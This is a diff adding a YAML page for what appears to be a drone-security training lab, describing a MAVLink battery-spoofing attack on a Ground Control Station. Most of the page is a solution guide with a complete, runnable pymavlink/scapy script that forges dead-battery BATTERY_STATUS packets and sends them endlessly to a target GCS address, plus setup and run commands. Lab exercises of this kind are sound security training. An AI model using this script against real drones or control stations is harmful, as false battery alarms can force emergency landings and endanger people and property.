@@ -1,0 +1,99 @@
+title: Battery Spoofing
+order: 2
+description: Spoofing the drone's battery status to mislead the Ground Control Station (GCS) into thinking the battery is critically low or dead.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Reconnaissance
+  - text: Battery Spoofing
+
+sections:
+  - title: Description
+    content: |
+      Battery spoofing involves sending false battery status data to the Ground Control Station (GCS) 
+      to mislead it about the drone's actual battery status. This can cause the operator to think the 
+      drone's battery is critically low or dead, potentially triggering emergency landing protocols or 
+      other safety measures.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `battery-spoof.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+          import sys
+
+          def create_battery_status():
+              """
+              Create a MAVLink BATTERY_STATUS message indicating a dead battery.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              battery_status = mav.battery_status_encode(
+                  id=0,  # Battery ID
+                  battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,  # Function of the battery
+                  type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,  # Type of battery
+                  temperature=300,  # Temperature in celsius * 10
+                  voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],  # Very low battery voltage of cells (in millivolts)
+                  current_battery=-1,  # Battery current in 10*milliamperes (-1 for not measured)
+                  current_consumed=5000,  # Consumed current in mAh (high value indicating usage)
+                  energy_consumed=10000,  # Consumed energy in 1/100th Joules (high value indicating usage)
+                  battery_remaining=0  # Remaining battery energy (0% - indicating dead battery)
+              )
+
+              return battery_status.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python battery_spoof.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              while True:
+                  battery_status_packet = create_battery_status()
+
+                  send_mavlink_packet(battery_status_packet, target_ip, target_port)
+                  
+                  print(f"Sent battery status packet to {target_ip}:{target_port}")
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python battery-spoof.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`.
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed battery status being displayed. The drone's battery status will appear critically low or dead, potentially triggering emergency protocols.
